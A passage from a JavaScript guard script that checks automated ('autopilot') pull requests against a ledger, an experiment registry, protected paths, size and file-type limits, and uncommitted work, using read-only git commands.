        const earlier = lastParsed ? [...new Set([idInText(old.raw), now.value.id])].filter((id) => typeof id === 'string' && !onBase.has(id)).map(lastParsed).find(Boolean) || null : null;
        if (earlier) {
          const label = `entry "${earlier.id}"`;
          const inherited = new Set(schema(earlier).filter((problem) => problem.legacy).map((problem) => problem.message));
          for (const problem of [...existingEntryProblems(earlier, now.value, today), ...schema(now.value).map((p) => p.message), ...shippedOnProblems(earlier, now.value, mergedOn)]) {
            if (inherited.has(problem)) w(now.number, `${label}: ${problem} (as it last parsed on the base)`);
            else v(now.number, `${label}: ${problem}`);
          }
          if (names) for (const problem of metricProblems(earlier, names)) w(now.number, `${problem} (as it last parsed on the base)`);
        } else {
          repaired = true;
          for (const problem of [...schema(now.value).map((p) => p.message), ...(names ? metricProblems(now.value, names) : []), ...repairedShippedOnProblems(old, now.value, addedOn)]) v(now.number, problem);
        }
        if (typeof now.value.id === 'string') {
          if (ids.has(now.value.id)) v(now.number, `id "${now.value.id}" is already used on line ${ids.get(now.value.id)}; a repaired line keeps an id of its own`);
          else ids.set(now.value.id, now.number);
        }
      }
      continue;
    }
    // The metric fields never change once written (existingEntryProblems), so an unknown name here came with the base.
    if (names) for (const problem of metricProblems(old.value, names)) w(old.number, `${problem} (already on the base)`);
    if (now.raw === old.raw) {
      for (const { message } of schema(old.value)) w(old.number, `${message} (already on the base)`);
      continue;
    }
    // A LEGACY rule's field never changes once written, so an edit neither caused a gap the base line already had nor
    // can fill it: it stays a warning, and the line can still be shipped, concluded or reverted.
    const inherited = new Set(schema(old.value).filter((problem) => problem.legacy).map((problem) => problem.message));
    for (const problem of [...existingEntryProblems(old.value, now.value, today), ...schema(now.value).map((p) => p.message), ...shippedOnProblems(old.value, now.value, mergedOn)]) {
      if (inherited.has(problem)) w(now.number, `entry "${old.value.id}": ${problem} (already on the base)`);
      else v(now.number, `entry "${old.value.id}": ${problem}`);
    }
  }
  const added = head.filter((entry) => !taken.has(entry));
  if (!added.length && !bookkeeping) v(null, `adds no line (the base has ${base.length}, the head ${head.length}); append one entry for this change (only a pull request that changes nothing but existing ledger lines, autopilot/backlog.md and autopilot/LEARNINGS.md needs none)`);
  if (added.length && !bookkeeping && branchId && !added.some((entry) => entry.value?.id === branchId && entry.value.status === 'proposed')) v(null, `append a new "proposed" entry with id "${branchId}" for this change; a closed-unmerged record does not pre-register a site change`);
  if (added.length > LIMITS.ledgerLines) v(null, `adds ${added.length} lines; at most ${LIMITS.ledgerLines} per pull request`);
  // Fail closed: without the registered names no new or repaired entry's metrics can be checked.
  if (!names && (repaired || added.some((entry) => !entry.error))) {
    violations.push({ rule: 'ledger', file: METRICS, line: null, message: metrics instanceof Set
      ? 'defines no metric names on the base (a backticked name@vN in the first column of its "## 1. Definitions" table), so the metrics of new or repaired ledger entries cannot be checked'
      : 'is missing on the base, so the metrics of new or repaired ledger entries cannot be checked (its "## 1. Definitions" table defines the names)' });
  }
  for (const entry of added) {
    if (entry.error) { v(entry.number, `line ${entry.error}`); continue; }
    for (const problem of [...schema(entry.value).map((p) => p.message), ...newEntryProblems(entry.value, { branchDate, branchId, pr, today }), ...(names ? metricProblems(entry.value, names) : [])]) v(entry.number, problem);
    if (typeof entry.value.id === 'string') {
      if (ids.has(entry.value.id)) v(entry.number, `id "${entry.value.id}" is already used on line ${ids.get(entry.value.id)}`);
      else ids.set(entry.value.id, entry.number);
    }
  }
}

// ---------- Experiment occupancy ----------

const EXPERIMENT_REGISTRY = 'lib/experiments.ts';
const ACTIVE_EXPERIMENT = new Set(['proposed', 'shipped']);

/**
 * Read data, never execute PR code. The registry is one exported literal EXPERIMENTS array, with optional
 * `as const`; comments, quoted/unquoted keys and trailing commas are fine. Dynamic expressions, spreads,
 * imports and later mutations fail closed. Keep types/helpers in the protected experiment framework.
 */
function readExperimentRegistry(source) {
  if (source === null) return null;
  let at = 0;
  const tokens = [];
  while (at < source.length) {
    const rest = source.slice(at);
    const space = /^(?:\s+|\/\/[^\r\n\u2028\u2029]*(?:[\r\n\u2028\u2029]|$)|\/\*[\s\S]*?\*\/)/.exec(rest);
    if (space) { at += space[0].length; continue; }
    const string = /^(?:"(?:[^"\\\r\n]|\\.)*"|'(?:[^'\\\r\n]|\\.)*')/.exec(rest);
    if (string) {
      // JSON escapes plus escaped single quotes. No template evaluation or JavaScript string execution.
      const raw = string[0];
      const value = raw[0] === '"' ? JSON.parse(raw) : JSON.parse('"' + raw.slice(1, -1).replace(/\\'/g, "'").replace(/(?<!\\)"/g, '\\"') + '"');
      tokens.push({ kind: 'string', value }); at += raw.length; continue;
    }
    const word = /^(?:[A-Za-z_$][\w$]*|-?\d+(?:\.\d+)?(?:[eE][+-]?\d+)?)/.exec(rest);
    if (word) { tokens.push({ kind: 'word', value: word[0] }); at += word[0].length; continue; }
    tokens.push({ kind: 'symbol', value: source[at++] });
  }
  let i = 0;
  const is = (value) => tokens[i]?.value === value && tokens[i]?.kind !== 'string';
  const need = (value) => { if (!is(value)) throw new Error(`expected ${value} in a data-only EXPERIMENTS registry`); i += 1; };
  const literal = (depth = 0) => {
    if (depth > 20) throw new Error('registry nesting is too deep');
    if (is('[')) {
      i += 1; const out = [];
      while (!is(']')) { out.push(literal(depth + 1)); if (!is(',')) break; i += 1; }
      need(']'); return out;
    }
    if (is('{')) {
      i += 1; const out = Object.create(null);
      while (!is('}')) {
        const key = tokens[i++];
        if (!key || !['string', 'word'].includes(key.kind) || Object.hasOwn(out, key.value)) throw new Error('invalid or duplicate registry property');
        need(':'); out[key.value] = literal(depth + 1); if (!is(',')) break; i += 1;
      }
      need('}'); return out;
    }
    const token = tokens[i++];
    if (token?.kind === 'string') return token.value;
    if (token?.kind === 'word') {
      if (token.value === 'true') return true;
      if (token.value === 'false') return false;
      if (token.value === 'null') return null;
      if (/^-?\d/.test(token.value) && Number.isFinite(Number(token.value))) return Number(token.value);
    }
    throw new Error('registry values must be literals (no imports, spreads or executable expressions)');
  };
  need('export'); need('const'); need('EXPERIMENTS'); need('=');
  const result = literal();
  if (is('as')) { i += 1; need('const'); }
  if (is(';')) i += 1;
  if (i !== tokens.length || !Array.isArray(result)) throw new Error('registry must contain only export const EXPERIMENTS = [literal entries]');
  return result;
}

const scopeOf = (entry) => ({ pages: Array.isArray(entry.pages) ? [...entry.pages].sort() : entry.pages ?? null, area: entry.area === undefined ? '*' : entry.area });
const scopeText = ({ pages, area }) => `${JSON.stringify(pages)}${area === '*' ? '' : ` area ${JSON.stringify(area)}`}`;

/**
 * Each running registry key against its registration: the latest experiment ledger entry, of any status, whose
 * "experiment" is that key. Pages and area are fixed when an experiment is registered, so a concluded or reverted
 * entry still binds a key that keeps running. Other kinds only name the key, and a closed-unmerged record (reverted,
 * never shipped) never ran, so neither registers it. Returns key → { message, registered }.
 */
const registrationOf = (values, key) => values.filter((value) => value.kind === 'experiment' && value.experiment === key && !(value.status === 'reverted' && !value.shipped_on)).pop();
function registrationMismatches(ledger, registry) {
  const values = ledger.map((e) => e.value).filter(Boolean);
  const mismatches = new Map();
  for (const entry of registry) {
    if (!isObject(entry) || entry.status !== 'running' || typeof entry.key !== 'string') continue;
    const runs = scopeOf(entry);
    const registration = registrationOf(values, entry.key);
    if (!registration) mismatches.set(entry.key, { registered: false, message: `experiment "${entry.key}" runs on ${scopeText(runs)} but no experiment ledger entry registers it; register a new experiment instead` });
    else if (!sameJson(runs, scopeOf(registration))) mismatches.set(entry.key, { registered: true, message: `experiment "${entry.key}" runs on ${scopeText(runs)} but was registered for ${scopeText(scopeOf(registration))}; register a new experiment instead` });
  }
  return mismatches;
}

/** What an experiment's run is in the registry, besides its scope: the day it starts and its arms. */
const RUN_FIELDS = ['started', 'variants', 'weights'];

/**
 * A key's run is set by the pull request that registers its experiment, and then fixed while that registration stands:
 * the readout counts from `started` (and the due date from it), and compares `variants`, weighted by `weights`, so
 * moving any of them later would choose the windows or the arms after seeing the data. A new registration names its
 * start (the framework refuses an entry without one), on or after its date and not after today; a key whose
 * registration is already on the base keeps the base's run, whether it runs or is paused (it may be removed), and
 * cannot be added again under it. A line already on the base that does not parse there is on the base too: repaired
 * (at its position, as checkLedger matches it), it registers no new run. Keys no experiment registers are left to the
 * pre-registration check.
 */
function runProblems(before, after, baseEntries, headEntries, today) {
  const problems = [];
  const baseIds = new Set(before.flatMap((e, index) => (e.value ? [e.value.id] : after[index]?.value ? [after[index].value.id] : [])));
  const values = after.map((e) => e.value).filter(Boolean);
  const onBase = new Map((baseEntries || []).filter((e) => isObject(e) && typeof e.key === 'string').map((e) => [e.key, e]));
  for (const entry of headEntries) {
    if (!isObject(entry) || typeof entry.key !== 'string') continue;
    const registration = registrationOf(values, entry.key);
    if (!registration) continue;
    const label = `experiment "${entry.key}"`;
    if (!baseIds.has(registration.id)) {
      const latest = today ? addDays(today, LIMITS.ledgerClockDays) : null;
      if (!(validDate(entry.started) && (!validDate(registration.date) || entry.started >= registration.date) && (!latest || entry.started <= latest))) {
        problems.push(`${label} ${given(entry.started) ? `starts on ${shown(entry.started)}` : 'has no "started"'}; a run registered by "${registration.id}" starts on or after its date ${registration.date} and not after today (${today || 'unknown'}, a day of slack aside), as YYYY-MM-DD`);
      }
      continue;
    }
    if (!baseEntries) continue; // the base's registry cannot be read: nothing to compare with
    const old = onBase.get(entry.key);
    if (!old) { problems.push(`${label} is added under "${registration.id}", which is already on main; a key's run (its start and arms) is set by the pull request that registers its experiment, so keep it removed (a revert keeps lib/experiments.ts as main has it), or register a new experiment to run it again`); continue; }
    for (const field of RUN_FIELDS) {
      if (!sameJson(old[field], entry[field])) problems.push(`${label} changes "${field}" from ${shown(old[field])} to ${shown(entry[field])} while "${registration.id}" registers it; a run keeps its start and arms (pause or remove it, or register a new experiment)`);
    }
  }
  return problems;
}

/**
 * The keys a registry change stops and starts: one running before it and paused or gone after it is stopped; one
 * running after it and not before (added running, or resumed) is started; a running key given a new run (other `pages`
 * or `area`, or another `started`, `variants` or `weights`, as a new registration sets) is both. Its scope is part of its
 * run because a new registration may be dated on or before the key's start, and so keep the start and arms while it
 * moves the key: that stops the run its old registration judged and starts another. The automatic revert reads this too.
 */
function runningChanges(baseEntries, headEntries) {
  const runs = (entries) => new Map((entries || []).filter((e) => isObject(e) && e.status === 'running' && typeof e.key === 'string').map((e) => [e.key, JSON.stringify([scopeOf(e), ...RUN_FIELDS.map((field) => e[field] ?? null)])]));
  const before = runs(baseEntries);
  const after = runs(headEntries);
  return { stopped: [...before].filter(([key, run]) => after.get(key) !== run).map(([key]) => key), started: [...after].filter(([key, run]) => before.get(key) !== run).map(([key]) => key) };
}

/**
 * Keep each running key on its registered scope and run, and reserve slots for proposed/shipped ledger experiments AND
 * running registry entries; count a shared key once. `today` is the UTC day of the check (null: not compared).
 */
function checkExperiments(baseLedger, headLedger, baseRegistry, headRegistry, violations, warnings = [], { today = null } = {}) {
  const before = parseLedger(baseLedger) || [];
  const after = parseLedger(headLedger) || [];
  const fail = (message, file = LEDGER) => violations.push({ rule: 'experiment', file, line: null, message });
  // Every running key keeps the scope it was registered with. A mismatch already on the base is a warning, so a pull
  // request that changes neither the registry nor the ledger (or not that key's part of them) is never blocked by it.
  const readable = (source) => { try { return readExperimentRegistry(source) || []; } catch { return null; } };
  const headEntries = readable(headRegistry);
  if (headEntries) {
    const baseParsed = readable(baseRegistry);
    const baseEntries = baseParsed || [];
    const already = registrationMismatches(before, baseEntries);
    const runningBefore = new Set(baseEntries.filter((e) => isObject(e) && e.status === 'running').map((e) => e.key));
    for (const [key, { registered, message }] of registrationMismatches(after, headEntries)) {
      if (already.get(key)?.message === message) warnings.push({ rule: 'experiment', file: EXPERIMENT_REGISTRY, line: null, message: `${message} (already on the base)` });
      // A newly running key without any registration is reported below, as a missing pre-registration.
      else if (registered || runningBefore.has(key)) fail(message, EXPERIMENT_REGISTRY);
    }
    for (const message of runProblems(before, after, baseParsed, headEntries, today)) fail(message, EXPERIMENT_REGISTRY);
  }
  const prior = new Set(before.filter((e) => e.value).map((e) => e.value.id));
  const newExperiments = after.filter((e) => e.value?.kind === 'experiment' && ACTIVE_EXPERIMENT.has(e.value.status) && !prior.has(e.value.id));
  const changedRegistry = baseRegistry !== headRegistry;
  if (!newExperiments.length && !changedRegistry) return;
  if (after.some((e) => e.error)) { fail('cannot establish experiment occupancy from an invalid ledger line'); return; }
  if (headRegistry === null && baseRegistry !== null) { fail('the experiment registry cannot be removed; pause or remove its entries instead', EXPERIMENT_REGISTRY); return; }
  if (headRegistry === null && newExperiments.length) { fail('cannot start an experiment until the data-only lib/experiments.ts registry exists'); return; }
  let registry; let oldRegistry;
  try { registry = readExperimentRegistry(headRegistry) || []; oldRegistry = readExperimentRegistry(baseRegistry) || []; }
  catch (error) { fail(`cannot establish experiment occupancy: ${error.message}`, EXPERIMENT_REGISTRY); return; }
  const scope = (entry, label) => {
    if (!Array.isArray(entry.pages) || !entry.pages.length || entry.pages.some((page) => typeof page !== 'string' || !EXPERIMENT_PAGE.test(page)) || new Set(entry.pages).size !== entry.pages.length) {
      fail(`${label} requires nonempty, unique canonical "pages" (site paths or "*")`); return null;
    }
    const area = entry.area === undefined ? '*' : entry.area;
    if (area !== '*' && (typeof area !== 'string' || !EXPERIMENT_KEY.test(area))) { fail(`${label} "area" must be a lower-case slug or "*"`); return null; }
    return { pages: [...entry.pages].sort(), area };
  };
  const occupied = new Map();
  const ledgerEntries = new Map();
  for (const entry of after.map((e) => e.value).filter((e) => e?.kind === 'experiment' && ACTIVE_EXPERIMENT.has(e.status))) {
    const key = entry.experiment;
    if (typeof key !== 'string' || !EXPERIMENT_KEY.test(key)) { fail(`active ledger experiment "${entry.id}" requires its registry "experiment" key`); continue; }
    if (ledgerEntries.has(key)) { fail(`more than one active ledger entry uses experiment key "${key}"`); continue; }
    ledgerEntries.set(key, entry);
    const value = scope(entry, `experiment "${key}"`);
    if (value) occupied.set(key, value);
  }
  const registryKeys = new Set();
  const previouslyRunning = new Set(oldRegistry.filter((e) => e?.status === 'running').map((e) => e.key));
  for (const entry of registry) {
    if (!isObject(entry) || typeof entry.key !== 'string' || !EXPERIMENT_KEY.test(entry.key) || !['running', 'paused'].includes(entry.status) || registryKeys.has(entry.key)) {
      fail('registry entries require unique keys and status "running" or "paused"', EXPERIMENT_REGISTRY); continue;
    }
    registryKeys.add(entry.key);
    if (entry.status !== 'running') continue;
    const value = scope(entry, `registry experiment "${entry.key}"`);
    if (!value) continue;
    if (!previouslyRunning.has(entry.key)) {
      const registration = ledgerEntries.get(entry.key);
      if (!registration || ledgerEntryProblems(registration).length) fail(`newly running registry experiment "${entry.key}" needs a valid active, pre-registered experiment ledger entry; a concluded or reverted experiment never runs again (a revert keeps lib/experiments.ts as main has it), so register a new experiment to run it`, EXPERIMENT_REGISTRY);
    }
    // Its scope was checked against its registration above. Count it even if bookkeeping has already marked its
    // ledger entry concluded or reverted.
    occupied.set(entry.key, value);
  }
  // Stop experiments or start them, never both: an automatic revert keeps main's registry after a merge that only
  // stopped some, so a concluded experiment stays stopped, and reverts it after one that started one, so it stops with
  // its code. A merge that did both could not be reverted without restarting the stopped experiment.
  const { stopped, started } = runningChanges(oldRegistry, registry);
  if (stopped.length && started.length) {
    const named = (keys) => `${keys.length === 1 ? 'experiment' : 'experiments'} ${keys.map((key) => `"${key}"`).join(', ')}`;
    const again = started.some((key) => stopped.includes(key)) ? ' (a running key given other pages, another area or a new run counts as both)' : '';
    fail(`this pull request stops ${named(stopped)} and starts ${named(started)}${again}; conclude or pause the running experiment in one pull request and start the new one in the next: an automatic revert keeps lib/experiments.ts as main has it after a merge that only stops experiments, and reverts it after one that starts any, so it could not undo both`, EXPERIMENT_REGISTRY);
  }
  if (occupied.size > 2) fail(`${occupied.size} experiments would be active; at most 2 may be proposed, shipped or running`);
  const entries = [...occupied];
  for (let a = 0; a < entries.length; a += 1) for (let b = a + 1; b < entries.length; b += 1) {
    const [ka, sa] = entries[a]; const [kb, sb] = entries[b];
    const pagesOverlap = sa.pages.includes('*') || sb.pages.includes('*') || sa.pages.some((page) => sb.pages.includes(page));
    if (pagesOverlap && (sa.area === '*' || sb.area === '*' || sa.area === sb.area)) fail(`experiments "${ka}" and "${kb}" overlap on the same page area (an omitted area reserves the whole page)`);
  }
}

// ---------- The check ----------

function currentBranch(cwd) {
  const out = git(cwd, ['symbolic-ref', '--short', '-q', 'HEAD'], { allowFail: true });
  return out ? out.trim() : null;
}

/**
 * The day each ledger entry's line reached `commit`'s history: the UTC committer day of the first first-parent commit
 * whose ledger has a line with that id (on main, its pull request's squash merge, the day the automatic revert records
 * as shipped_on). `git log -G` finds the commits whose ledger diff touches such a line, and each is confirmed by parsing
 * its ledger. null when the history cannot show it (a shallow clone's boundary, or an id written with escapes).
 */
/** A `git log -G` pattern for a ledger line with this id. */
const idPattern = (id) => `"id" *: *"${id.replace(/[.*+?^$|()[\]{}\\]/g, (char) => `\\${char}`)}"`;
/** First-parent `git log` of the ledger in `commit`'s history, as { sha, day, hidden }: hidden when a shallow clone's boundary hides its parents. */
function logged(cwd, args) {
  let shallow = null;
  return (git(cwd, ['log', '--first-parent', '--format=%H %cI %P', ...args, '--', LEDGER], { allowFail: true }) || '').split('\n').filter(Boolean).map((line) => {
    const [sha, date, ...parents] = line.split(' ').filter(Boolean);
    if (!parents.length && shallow === null) shallow = (git(cwd, ['rev-parse', '--is-shallow-repository'], { allowFail: true }) || '').trim() === 'true';
    return { sha, day: new Date(date).toISOString().slice(0, 10), hidden: !parents.length && shallow };
  });
}
const memo = (fn) => { const found = new Map(); return (key) => { if (!found.has(key)) found.set(key, fn(key)); return found.get(key); }; };
const parsedWithId = (cwd, sha, id) => (parseLedger(showFile(cwd, sha, LEDGER)) || []).filter((entry) => entry.value?.id === id);

function mergedOnBase(cwd, commit) {
  return memo((id) => {
    for (const { sha, day, hidden } of logged(cwd, ['--reverse', `-G${idPattern(id)}`, commit])) {
      if (!parsedWithId(cwd, sha, id).length) continue;
      return hidden ? null : { day, commit: sha };
    }
    return null;
  });
}

/**
 * The entry with this id as it last parsed in `commit`'s history (for a line that no longer parses there): the ledger
 * of the newest first-parent commit whose ledger diff touches a line with that id and still has one that parses. null
 * when it never parsed there, or the history cannot show it.
 */
function lastParsedOnBase(cwd, commit) {
  return memo((id) => {
    for (const { sha } of logged(cwd, [`-G${idPattern(id)}`, commit])) {
      const found = parsedWithId(cwd, sha, id);
      if (found.length) return found[found.length - 1].value;
    }
    return null;
  });
}

/** The day a line's exact text reached `commit`'s history: the first first-parent commit that adds it ({ day, commit }, or null). */
function addedOnBase(cwd, commit) {
  return memo((raw) => {
    const [first] = logged(cwd, ['--reverse', `-S${raw}`, commit]);
    return first && !first.hidden ? { day: first.day, commit: first.sha } : null;
  });
}

/**
 * The lines a revert may put back, by file: for each ledger entry the change moves to "reverted" with verdict "revert",
 * the lines its merge commit (mergedOn, the commit that put its line on the base) deleted from each file, by trimmed
 * text and count; all of a file it deleted or renamed away. They were on the base before that merge, as owner code or
 * code that passed the guard, so the same line coming back to the same file is not new code (the skill's §5.6).
 */
function restorableLines(cwd, base, head, mergedOn) {
  const before = new Map((parseLedger(showFile(cwd, base, LEDGER)) || []).filter((e) => e.value && typeof e.value.id === 'string').map((e) => [e.value.id, e.value]));
  const pool = new Map();
  const done = new Set();
  for (const { value: now } of parseLedger(showFile(cwd, head, LEDGER)) || []) {
    const old = now && typeof now.id === 'string' ? before.get(now.id) : null;
    if (!old || old.status === 'reverted' || now.status !== 'reverted' || now.verdict !== 'revert') continue;
    const merged = mergedOn(now.id);
    const parent = merged && !done.has(merged.commit) ? (git(cwd, ['rev-parse', '--verify', '--quiet', `${merged.commit}^`], { allowFail: true }) || '').trim() : '';
    if (!parent) continue; // none, a root commit, or already counted
    done.add(merged.commit);
    for (const change of changedEntries(cwd, parent, merged.commit)) {
      const oldBlob = change.oldPath ? blob(cwd, change.oldSha) : null;
      if (!isText(oldBlob)) continue;
      const lines = change.newPath === change.oldPath ? textChange(cwd, parent, merged.commit, change).deleted : oldBlob.toString('utf8').split('\n');
      const counts = pool.get(change.oldPath) || new Map();
      for (const text of lines.map((line) => line.trim()).filter(Boolean)) counts.set(text, (counts.get(text) || 0) + 1);
      pool.set(change.oldPath, counts);
    }
  }
  return pool;
}

/**
 * Checks one change. Returns { ok, skipped, branch, base, head, mergeBase, files, changedLines, textBytes, binaryBytes,
 * violations, warnings }. Each violation or warning is { rule, file, line, message }; warnings never fail the check.
 */
function check({ cwd = process.cwd(), base, head, branch, pr = null, now = new Date() } = {}) {
  if (!base || !head) throw new GitError('--base and --head are required');
  let name = branch || process.env.GITHUB_HEAD_REF || '';
  if (!name && head === 'HEAD') name = currentBranch(cwd) || '';
  const result = { ok: true, skipped: false, branch: name || null, base, head, pr, mergeBase: null, files: 0, changedLines: 0, textBytes: 0, binaryBytes: 0, violations: [], warnings: [] };
  if (!name.startsWith(BRANCH_PREFIX)) return { ...result, skipped: true };

  const violations = result.violations;
  const add = (rule, file, line, message) => violations.push({ rule, file, line, message });
  const branchMatch = BRANCH_NAME.exec(name);
  if (!branchMatch || name.length > BRANCH_MAX || !validDate(branchMatch[1])) add('branch-name', null, null, `"${name}" must match autopilot/YYYY-MM-DD-slug (a real date; lower-case letters, digits and single hyphens) and be at most ${BRANCH_MAX} characters`);
  const branchDate = branchMatch && validDate(branchMatch[1]) ? branchMatch[1] : null;
  const branchId = branchDate && name.length <= BRANCH_MAX ? name.slice(BRANCH_PREFIX.length) : null;

  const headSha = git(cwd, ['rev-parse', '--verify', '--quiet', `${head}^{commit}`]).trim();
  const baseSha = git(cwd, ['rev-parse', '--verify', '--quiet', `${base}^{commit}`]).trim();
  const mergeBase = git(cwd, ['merge-base', baseSha, headSha]).trim();
  result.mergeBase = mergeBase;

  const entries = changedEntries(cwd, mergeBase, headSha);
  result.files = entries.length;
  const mergedOn = mergedOnBase(cwd, mergeBase);
  const verbs = { A: 'added', D: 'deleted', M: 'changed', R: 'renamed', C: 'copied', T: 'changed type' };
  const scanned = (file) => !isProse(file) && !protectedBy(file);
  // Lines deleted from scanned files, by trimmed text. An added line identical to one of them is existing code that
  // moved (a component split in two, functions reordered), so a pattern it already had is not reported again.
  const deletedPool = new Map();
  const pending = [];
  for (const entry of entries) {
    const verb = verbs[entry.status] || 'changed';
    for (const file of new Set([entry.oldPath, entry.newPath].filter(Boolean))) {
      const why = protectedBy(file);
      if (why) add('protected-path', file, null, `${verb}; ${why} (autopilot/CONSTITUTION.md §6)`);
    }
    if (entry.oldPath && ROUTE_FILE.test(entry.oldPath) && entry.oldPath !== entry.newPath) {
      add('route-deletion', entry.oldPath, null, entry.newPath ? `renamed to ${entry.newPath}; moving a page changes its URL (owner decision)` : 'deleted; removing a page removes its URL (owner decision)');
    }
    if (entry.newPath && entry.oldPath !== entry.newPath && SITE_JS.test(entry.newPath)) {
      add('file-type', entry.newPath, null, `${verb}; site code is TypeScript (.ts, .tsx): a JavaScript file is not type-checked and would replace a .ts or .tsx module of the same name`);
    }
    if (entry.newPath && (entry.newMode === '120000' || entry.newMode === '160000')) {
      add('file-type', entry.newPath, null, entry.newMode === '120000' ? 'symbolic links are not allowed' : 'submodules are not allowed');
      continue;
    }
    const where = entry.newPath || entry.oldPath;
    const newBlob = entry.newPath ? blob(cwd, entry.newSha) : null;
    if (MEDIA.test(where)) {
      if (!binaryAllowedAt(where)) add('binary', where, null, 'images, fonts and media may change only under public/ (not public/data/), or as a Next.js icon or share image under app/ (favicon.ico, icon, apple-icon, opengraph-image, twitter-image)');
      if (newBlob) {
        result.binaryBytes += newBlob.length;
        if (newBlob.length > LIMITS.binaryBytes) add('binary', entry.newPath, null, `${Math.round(newBlob.length / 1024)} KB; each binary file may be at most ${LIMITS.binaryBytes / 1024} KB`);
      }
      continue;
    }
    if (newBlob && !isText(newBlob)) {
      add('file-type', entry.newPath, null, `is not UTF-8 text; only ${MEDIA_TYPES.join(', ')} files may be binary`);
      continue;
    }
    const oldBlob = entry.oldPath ? blob(cwd, entry.oldSha) : null;
    if (!newBlob && oldBlob && !isText(oldBlob)) continue; // a deleted binary file
    const { added, deleted } = textChange(cwd, mergeBase, headSha, entry);
    const addedBytes = added.reduce((sum, item) => sum + Buffer.byteLength(item.text) + 1, 0);
    result.textBytes += addedBytes;
    if (where !== LEDGER) result.changedLines += added.length + deleted.length;
    if (entry.oldPath && scanned(entry.oldPath)) {
      for (const text of deleted) if (text.trim()) deletedPool.set(text.trim(), (deletedPool.get(text.trim()) || 0) + 1);
    }
    if (addedBytes > LIMITS.textBytes) add('size', where, null, `adds ${Math.round(addedBytes / 1024)} KB of text; at most ${LIMITS.textBytes / 1024} KB per file`);
    if (!entry.newPath || isProse(entry.newPath)) continue;
    if (!entry.newPath.startsWith('public/')) {
      const long = added.find((item) => item.text.length > LIMITS.lineLength);
      if (long) add('size', entry.newPath, long.line, `a line of ${long.text.length} characters; at most ${LIMITS.lineLength} (no minified or inlined blobs)`);
    }
    // A file moved here from a path that was never scanned (documentation, or somewhere off limits) is read in full.
    const movedIn = entry.oldPath && entry.oldPath !== entry.newPath && !scanned(entry.oldPath);
    pending.push({ file: entry.newPath, lines: movedIn ? allLines(newBlob.toString('utf8')) : added, movedIn });
  }
  // A line a revert puts back where its reverted merge deleted it is not reported either (restorableLines).
  const restorable = restorableLines(cwd, mergeBase, headSha, mergedOn);
  for (const { file, lines, movedIn } of pending) {
    const moved = new Set();
    const putBack = restorable.get(file) || new Map();
    for (const item of lines) {
      const text = item.text.trim();
      const count = movedIn ? 0 : deletedPool.get(text) || 0;
      if (count > 0) { moved.add(item.line); deletedPool.set(text, count - 1); continue; }
      const back = putBack.get(text) || 0;
      if (back > 0) { moved.add(item.line); putBack.set(text, back - 1); }
    }
    const blocks = addedBlocks(lines);
    scan(file, blocks, FORBIDDEN, 'forbidden-pattern', violations, moved);
    if (MARKUP_FILE.test(file)) scan(file, blocks, FORBIDDEN_MARKUP, 'forbidden-pattern', violations, moved);
    scanUrls(file, blocks, violations, moved);
    scan(file, blocks, BANNED, 'banned-copy', violations, moved);
  }
  if (result.binaryBytes > LIMITS.binaryTotalBytes) add('size', null, null, `binary files total ${(result.binaryBytes / 1024 / 1024).toFixed(2)} MB; at most ${LIMITS.binaryTotalBytes / 1024 / 1024} MB`);
  if (result.textBytes > LIMITS.textTotalBytes) add('size', null, null, `adds ${(result.textBytes / 1024 / 1024).toFixed(2)} MB of text; at most ${LIMITS.textTotalBytes / 1024 / 1024} MB`);
  if (entries.length > LIMITS.files) add('size', null, null, `${entries.length} changed files; at most ${LIMITS.files}`);
  if (result.changedLines > LIMITS.lines) add('size', null, null, `${result.changedLines} changed lines (added + deleted, not counting ${LEDGER}); at most ${LIMITS.lines}`);

  const layout = showFile(cwd, headSha, 'app/layout.tsx');
  const layoutBefore = showFile(cwd, mergeBase, 'app/layout.tsx');
  if (layout === null) add('required-content', 'app/layout.tsx', null, 'is missing');
  // app/layout.* is protected, so this only matters when the pull request changed it (and fails anyway); an unchanged
  // layout is main's own and is not re-read, so main's wording can never block an unrelated pull request.
  else if (layout !== layoutBefore) for (const problem of layoutProblems(layout, layoutBefore)) add('required-content', 'app/layout.tsx', null, problem);

  const bookkeeping = entries.length > 0 && entries.every((entry) => [entry.oldPath, entry.newPath].filter(Boolean).every((file) => BOOKKEEPING.includes(file)));
  // Metric names come from the base ref itself: autopilot/metrics.md is protected, so the head's copy is the same on
  // an autopilot pull request, and a pull request cannot register a name for its own entry.
  const metrics = metricNames(showFile(cwd, baseSha, METRICS));
  // The ledger's dates are compared with the UTC day of the head commit, so a result never changes with the day it is
  // run, or with the clock's day if that is earlier: anyone can set a commit's date, and one dated in the future would
  // let an entry claim days that have not happened yet.
  const commitDay = new Date(git(cwd, ['show', '-s', '--format=%cI', headSha]).trim()).toISOString().slice(0, 10);
  const clockDay = new Date(now).toISOString().slice(0, 10);
  const today = commitDay < clockDay ? commitDay : clockDay;
  checkLedger(showFile(cwd, mergeBase, LEDGER), showFile(cwd, headSha, LEDGER), { violations, warnings: result.warnings, branchDate, branchId, pr, bookkeeping, metrics, today, mergedOn, lastParsed: lastParsedOnBase(cwd, mergeBase), addedOn: addedOnBase(cwd, mergeBase) });
  checkExperiments(showFile(cwd, mergeBase, LEDGER), showFile(cwd, headSha, LEDGER), showFile(cwd, mergeBase, EXPERIMENT_REGISTRY), showFile(cwd, headSha, EXPERIMENT_REGISTRY), violations, result.warnings, { today });

  // The guard reads commits. Run on HEAD with work not yet committed, it would check (and pass) something else.
  if (head === 'HEAD') {
    const status = git(cwd, ['status', '--porcelain=v1', '-z'], { allowFail: true });
    const items = [];
    if (status) {
      const tokens = status.split('\0').filter(Boolean);
      for (let i = 0; i < tokens.length; i += 1) {
        items.push({ code: tokens[i].slice(0, 2), file: tokens[i].slice(3) });
        if (/^[RC]/.test(tokens[i])) i += 1; // a rename or copy is followed by its old path
      }
    }
    const tracked = items.filter((item) => item.code !== '??');
    const untracked = items.filter((item) => item.code === '??');
    const some = (list) => `${list.slice(0, 3).map((item) => item.file).join(', ')}${list.length > 3 ? ', …' : ''}`;
    if (tracked.length) add('uncommitted', null, null, `${tracked.length} changed file${tracked.length === 1 ? ' is' : 's are'} not committed (${some(tracked)}); the guard checks commits, not the working tree: commit, then run it again`);
    if (untracked.length) result.warnings.push({ rule: 'uncommitted', file: null, line: null, message: `${untracked.length} untracked file${untracked.length === 1 ? ' is' : 's are'} not checked (${some(untracked)}); commit ${untracked.length === 1 ? 'it' : 'them'} if ${untracked.length === 1 ? 'it belongs' : 'they belong'} to the change` });
  }
  result.ok = violations.length === 0;
  return result;
}

function report(result) {
